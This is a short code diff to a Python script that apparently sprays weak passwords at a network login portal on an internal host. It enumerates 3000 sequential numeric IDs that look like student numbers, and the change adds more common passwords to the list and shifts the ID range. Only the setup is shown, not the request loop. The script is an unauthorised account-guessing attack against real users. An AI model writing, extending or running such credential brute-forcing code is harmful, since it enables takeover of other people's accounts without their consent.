@@ -1,8 +1,8 @@
 import requests
 import time
 password = 'mima'
-weakpswd = ['111111', '11111111', '666666', '888888', '88888888']
-username = [1120170000 + i for i in range(3000)]
+weakpswd = ['111111', '11111111', '666666', '888888', '88888888', '000000', '123456']
+username = [1120160000 + i for i in range(3000)]
 url = 'http://10.0.0.55:801/srun_portal_pc.php'
 s = requests.session()
 count = 0
